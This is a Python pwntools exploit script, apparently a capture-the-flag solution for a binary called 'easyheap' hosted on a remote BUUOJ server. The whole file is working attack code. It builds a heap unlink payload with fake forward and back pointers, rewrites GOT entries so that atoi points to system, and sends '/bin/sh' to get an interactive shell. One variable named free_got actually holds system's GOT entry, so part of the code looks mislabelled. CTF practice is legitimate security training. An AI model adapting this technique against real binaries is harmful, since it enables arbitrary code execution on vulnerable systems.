#! /usr/bin/python

from pwn import *

debug = 0

if debug:
	p = process('./easyheap')
else:
	p = remote('node3.buuoj.cn',29043)

elf = ELF('./easyheap')
context.log_level = 'debug'

def menu(choice):
	p.recvuntil('Your choice :')
	p.sendline(str(choice))

def add(size,content):
	menu(1)
	p.recvuntil('Size of Heap : ')
	p.sendline(str(size))
	p.recvuntil('Content of heap:')
	p.sendline(content)

def edit(idx,size,content):
	menu(2)
	p.recvuntil('Index :')
	p.sendline(str(idx))
	p.recvuntil('Size of Heap : ')
	p.sendline(str(size))
	p.recvuntil('Content of heap :')
	p.sendline(content)

def delete(idx):
	menu(3)
	p.recvuntil('Index :')
	p.sendline(str(idx))

def l33t():
	menu(4869)


heap = 0x6020E0
fake_FD = heap + 0x8 - 0x18
fake_BK = heap + 0x8 - 0x10

###unlink###
add(0x80,'aaaa')#0
add(0x80,'bbbb')#1
add(0x80,'cccc')#2
add(0x80,'/bin/sh\x00')#3


payload = p64(0) + p64(0x80) + p64(fake_FD) + p64(fake_BK)
payload = payload.ljust(0x80,'A')
payload+= p64(0x80) + p64(0x90)
edit(1,len(payload),payload)

delete(2)

####hijack GOT###
system = elf.symbols['system']
free_got = elf.got['system']
atoi_got = elf.got['atoi']
success(hex(free_got))
success(hex(atoi_got))

payload = p64(0) + p64(0) + p64(free_got) + p64(atoi_got)
edit(1,len(payload),payload)

payload = p64(system)
edit(1,len(payload),payload)

#gdb.attach(p)

###get shell###
p.sendline('/bin/sh\x00')
p.interactive()



